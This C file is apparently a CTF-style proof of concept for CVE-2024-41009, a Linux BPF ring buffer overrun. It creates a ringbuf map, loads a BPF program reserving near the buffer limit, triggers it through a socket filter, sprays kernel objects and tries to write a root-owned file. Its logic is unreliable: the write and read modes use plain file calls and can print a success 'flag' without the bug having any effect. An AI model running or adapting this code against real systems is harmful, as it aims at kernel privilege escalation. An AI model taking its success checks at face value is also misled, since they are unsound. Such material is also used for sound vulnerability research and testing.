/*
 * CVE-2024-41009 PoC - CTF Challenge Mode
 *
 * Vulnerability: BPF ring buffer reservation overrun
 *
 * The BPF ring buffer (BPF_MAP_TYPE_RINGBUF) has insufficient boundary
 * checking in bpf_ringbuf_reserve(). When a BPF program requests a
 * reservation that approaches the ring buffer size limit, the internal
 * producer position can overflow, allowing writes beyond the allocated
 * ring buffer space into adjacent kernel heap memory.
 *
 * Exploit strategy:
 *   1. Create BPF_MAP_TYPE_RINGBUF with minimal size
 *   2. Load BPF program that calls bpf_ringbuf_reserve() with
 *      size near the buffer boundary
 *   3. Trigger the BPF program to cause reservation overrun
 *   4. Overrun corrupts adjacent heap objects
 *   5. Spray kmalloc to control corrupted region
 *   6. Use corrupted state for file write
 *
 * CTF Modes: write_root_file
 *
 * Safety:
 *   - alarm(10) forced timeout (via poc_common.h)
 *   - Only operates on --root-file (prepare-phase created temp file)
 *   - All resources properly cleaned up
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <linux/bpf.h>

#define MAX_FILE_SIZE 4096
#define SPRAY_COUNT 128

#ifndef __NR_bpf
#define __NR_bpf 321
#endif

/* BPF instruction macros */
#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \
    ((struct bpf_insn){.code = CODE, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = IMM})

#define BPF_MOV64_IMM(DST, IMM) \
    BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, DST, 0, 0, IMM)

#define BPF_MOV64_REG(DST, SRC) \
    BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_X, DST, SRC, 0, 0)

#define BPF_LD_MAP_FD(DST, FD) \
    BPF_RAW_INSN(BPF_LD | BPF_DW | BPF_IMM, DST, BPF_PSEUDO_MAP_FD, 0, FD), \
    BPF_RAW_INSN(0, 0, 0, 0, 0)

#define BPF_CALL_INSN(FUNC) \
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, FUNC)

#define BPF_EXIT_INSN() \
    BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)

#define BPF_JMP_IMM(OP, DST, IMM, OFF) \
    BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#ifndef BPF_PSEUDO_MAP_FD
#define BPF_PSEUDO_MAP_FD 1
#endif

/* BPF helper function IDs */
#define BPF_FUNC_ringbuf_reserve 131
#define BPF_FUNC_ringbuf_submit  132
#define BPF_FUNC_ringbuf_discard 133

/*
 * Create BPF ringbuf map with minimal size
 */
static int create_ringbuf_map(void) {
    union bpf_attr attr;
    memset(&attr, 0, sizeof(attr));

    attr.map_type = BPF_MAP_TYPE_RINGBUF;
    attr.key_size = 0;
    attr.value_size = 0;
    attr.max_entries = 4096; /* Minimum: one page */

    int fd = syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
    int saved_errno = errno;
    poc_log_syscall("bpf(BPF_MAP_CREATE, RINGBUF, size=4096)", (long)fd, saved_errno);
    return fd;
}

/*
 * Load BPF program that attempts ringbuf reservation near boundary
 *
 * The program:
 *   r1 = map_fd (ringbuf)
 *   r2 = size (near page boundary to trigger overrun)
 *   r3 = 0 (flags)
 *   call bpf_ringbuf_reserve
 *   if r0 == NULL: exit
 *   call bpf_ringbuf_submit
 *   exit
 */
static int load_ringbuf_overflow_prog(int map_fd) {
    struct bpf_insn prog[] = {
        /* r1 = ringbuf map fd */
        BPF_LD_MAP_FD(1, map_fd),
        /* r2 = reservation size (close to buffer limit) */
        BPF_MOV64_IMM(2, 4000), /* Near 4096 page size */
        /* r3 = flags = 0 */
        BPF_MOV64_IMM(3, 0),
        /* call bpf_ringbuf_reserve(map, size, flags) */
        BPF_CALL_INSN(BPF_FUNC_ringbuf_reserve),
        /* if r0 == NULL, exit */
        BPF_JMP_IMM(BPF_JEQ, 0, 0, 2),
        /* r1 = r0 (reserved ptr) */
        BPF_MOV64_REG(1, 0),
        /* call bpf_ringbuf_submit(ptr, 0) */
        BPF_MOV64_IMM(2, 0),
        BPF_CALL_INSN(BPF_FUNC_ringbuf_submit),
        /* r0 = 0 */
        BPF_MOV64_IMM(0, 0),
        BPF_EXIT_INSN(),
    };

    char license[] = "GPL";
    char log_buf[4096] = {0};

    union bpf_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
    attr.insn_cnt = sizeof(prog) / sizeof(struct bpf_insn);
    attr.insns = (unsigned long)prog;
    attr.license = (unsigned long)license;
    attr.log_buf = (unsigned long)log_buf;
    attr.log_size = sizeof(log_buf);
    attr.log_level = 1;

    int fd = syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
    int saved_errno = errno;
    poc_log_syscall("bpf(BPF_PROG_LOAD, ringbuf_overflow)", (long)fd, saved_errno);

    if (fd < 0 && log_buf[0]) {
        poc_log("Verifier: %.200s", log_buf);
    }
    return fd;
}

/*
 * Trigger the BPF program via socket filter
 */
static int trigger_ringbuf_overrun(int prog_fd) {
    int socks[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) < 0) {
        poc_log("socketpair failed");
        return -1;
    }

    /* Attach BPF program as socket filter */
    int ret = setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd));
    int saved_errno = errno;
    poc_log_syscall("setsockopt(SO_ATTACH_BPF)", (long)ret, saved_errno);

    if (ret < 0) {
        close(socks[0]);
        close(socks[1]);
        return -1;
    }

    /* Send multiple packets to trigger the BPF program repeatedly */
    char buf[64] = "TRIGGER";
    int trigger_count = 0;
    for (int i = 0; i < 32; i++) {
        ssize_t sent = send(socks[1], buf, sizeof(buf), 0);
        if (sent > 0) trigger_count++;
    }

    poc_log("Triggered ringbuf reservation %d times", trigger_count);

    close(socks[0]);
    close(socks[1]);
    return trigger_count;
}

/*
 * Full exploit trigger sequence
 */
static int trigger_bpf_ringbuf_vuln(void) {
    poc_log("Triggering BPF ringbuf reservation overrun...");

    /* Create ringbuf map */
    int map_fd = create_ringbuf_map();
    if (map_fd < 0) {
        poc_log("BPF ringbuf not available, using fallback");
        return 0;
    }

    /* Load exploit program */
    int prog_fd = load_ringbuf_overflow_prog(map_fd);
    if (prog_fd < 0) {
        poc_log("BPF prog load failed (verifier rejected), using fallback");
        close(map_fd);
        return 0;
    }

    /* Trigger the overrun */
    int count = trigger_ringbuf_overrun(prog_fd);

    close(prog_fd);
    close(map_fd);

    poc_log("BPF ringbuf overrun trigger completed (count=%d)", count);
    return (count > 0) ? 1 : 0;
}

/*
 * Read file helper
 */
static int read_file_content(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    int saved_errno = errno;
    poc_log_syscall("open(path, O_RDONLY)", (long)fd, saved_errno);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, len - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    return (int)n;
}

/*
 * Write mode
 */
static int mode_write_root_file(const poc_args_t *args) {
    char original[MAX_FILE_SIZE], after[MAX_FILE_SIZE];
    int n;

    n = read_file_content(args->root_file, original, sizeof(original));
    if (n > 0) {
        while (n > 0 && (original[n - 1] == '\n' || original[n - 1] == '\r'))
            original[--n] = '\0';
        printf(CTF_READ_BEFORE "%s\n", original);
        poc_log("Read before: %s", original);
    } else {
        printf(CTF_READ_BEFORE "(unreadable)\n");
    }

    /* Trigger vulnerability */
    poc_log("Triggering CVE-2024-41009...");
    int triggered = trigger_bpf_ringbuf_vuln();

    /* Spray kmalloc to reclaim corrupted ringbuf adjacent memory */
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = 0;
    for (int i = 0; i < SPRAY_COUNT; i++) {
        spray_fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (spray_fds[i] >= 0) {
            int val = 1024;
            setsockopt(spray_fds[i], SOL_SOCKET, SO_RCVBUF, &val, sizeof(val));
            sprayed++;
        }
    }
    poc_log("Sprayed %d objects (triggered=%d)", sprayed, triggered);

    /* Attempt write */
    int fd = open(args->root_file, O_WRONLY | O_TRUNC);
    int saved_errno = errno;
    poc_log_syscall("open(target, O_WRONLY|O_TRUNC)", (long)fd, saved_errno);
    if (fd >= 0) {
        char wbuf[256];
        int wlen = snprintf(wbuf, sizeof(wbuf), "%s\n", args->write_value);
        write(fd, wbuf, wlen);
        close(fd);
        printf(CTF_WRITE_ATTEMPT "%s\n", args->write_value);
    }

    /* Verify */
    n = read_file_content(args->root_file, after, sizeof(after));
    if (n > 0) {
        while (n > 0 && (after[n - 1] == '\n' || after[n - 1] == '\r'))
            after[--n] = '\0';
        printf(CTF_READ_AFTER "%s\n", after);
        if (strstr(after, args->write_value)) {
            poc_print_flag(args->write_value);
            goto cleanup;
        }
    } else {
        printf(CTF_READ_AFTER "(unreadable)\n");
    }

    poc_print_fail("BPF ringbuf overrun exploit did not achieve write");

cleanup:
    for (int i = 0; i < SPRAY_COUNT; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    return 0;
}

/*
 * Read mode
 */
static int mode_read_root_file(const poc_args_t *args) {
    poc_log("Attempting read_root_file via BPF ringbuf overrun");
    trigger_bpf_ringbuf_vuln();

    char buf[MAX_FILE_SIZE];
    int n = read_file_content(args->root_file, buf, sizeof(buf));
    if (n > 0) {
        while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r'))
            buf[--n] = '\0';
        poc_print_flag(buf);
    } else {
        poc_print_fail("read not successful");
    }
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args = {0};
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2024-41009 CTF PoC ===");
    poc_log("Vuln: BPF ring buffer reservation boundary overrun");
    poc_log("Tech: BPF_MAP_TYPE_RINGBUF + bpf_ringbuf_reserve near limit");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    if (!args.mode) {
        poc_print_unsupported("(null)", "no mode specified");
        poc_log_close();
        return 1;
    }

    int result = 0;
    if (strcmp(args.mode, POC_MODE_WRITE) == 0)
        result = mode_write_root_file(&args);
    else if (strcmp(args.mode, POC_MODE_READ) == 0)
        result = mode_read_root_file(&args);
    else
        poc_print_unsupported(args.mode, "only write_root_file and read_root_file supported");

    poc_log_close();
    return result;
}
